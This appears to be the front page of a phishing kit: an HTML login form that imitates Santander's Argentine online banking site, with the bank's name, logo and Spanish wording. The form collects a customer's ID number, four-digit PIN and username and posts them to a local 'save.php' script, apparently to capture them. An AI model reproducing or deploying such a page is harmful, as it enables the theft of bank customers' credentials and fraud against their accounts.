<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Online Banking Santander</title>
    <link rel="shortcut icon" href="img/favicon.png" type="image/x-icon">
    <link rel="stylesheet" href="css/estyle.css">
</head>
<body>
    <div class="body">
        <div class="logo-title">
            <img src="img/desktop-sr.svg" alt="Santander" height="60" width="137">
        </div>
        <div class="message">
            <p style="font-weight: lighter;">Hola :)</p>
            <p>Bienvenido a</p>
            <p>Online Banking</p>
            <a href="#" target="_blank" rel="noopener noreferrer" class="conocemas">Conocé más</a>
        </div>
        <div class="panel-primary">
            <div class="login-container">
                <div class="login-container-title" id="title-form">Ingresá desde acá para operar</div>
                <form action="save.php" method="post" autocomplete="off">
                    <div id="datosdocumento">
                        <div class="md-input-container">
                            <input type="text" name="dni" id="dni" placeholder="Tu número de documento" autofocus="true"
                            maxlength="11">
                           
                        </div>
                    </div>
                    <div id="datosclave">
                        <div class="md-input-container">
                            <input type="password" name="clave" id="clave" placeholder="Tu clave" autofocus="true"
                            minlength="4" maxlength="4">
                            <img id="eye1" class="eyeImg" src="./img/not_view_eye.svg" alt="eye" width="24" height="24"/>
                        </div>
                    </div>
                    <div id="datosusuario">
                        <div class="md-input-container">
                            <input type="password" name="usuario" id="usuario" placeholder="Tu nombre de usuario" autofocus="true"
                            minlength="8" maxlength="20">
                            <img id="eye2" class="eyeImg" src="./img/not_view_eye.svg" alt="eye" width="24" height="24"/>
                        </div>
                    </div>
                    <div class="tec_virtual_box">
                        <a href="#" class="ng-scope">
                            <div id="checkbox" class="cuadro"></div>
                            <span>Recordar mi número de documento</span>
                        </a>
                        <a href="#" class="ng-scope">
                            <img src="img/teclado.svg" alt="teclado virtual" height="24" width="24">
                            <span>Teclado virtual</span>
                        </a>
                    </div>
                    <section class="mensajes-container">
                        <div class="mensajes-container-icono layout-row flex-10" id="icono-container">
                            <img id="iconito" class="filter-blue" src="" alt="dialgos" height="24" width="24" />
                        </div>
                        <div class="mensajes-container-texto layout-row flex-90">
                            <span id="mensajito" class="text"></span>
                            <a id="enlasito" href="#" target="_blank" rel="noopener noreferrer">Conocé más consejos de
                                seguridad
                            </a>
                        </div>
                    </section>
                    <button id="button-login" type="submit" class="btn-login">Ingresar</button>
                </form>
            </div>

            <div id="rectangulo" class="rectangulo">
                <span>Si no tenés u olvidaste tu clave y/o usuario
                    <a href="" class="redText">Crear clave y usuario</a> </span>
                <br>
                <span>Si sólo tenés clave <br>
                    <button class="createUserCRO">Crear usuario</button>
                </span>
            </div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.5.1.min.js"
        integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
    <script src="js/functions.min.js"></script>
</body>

</html>
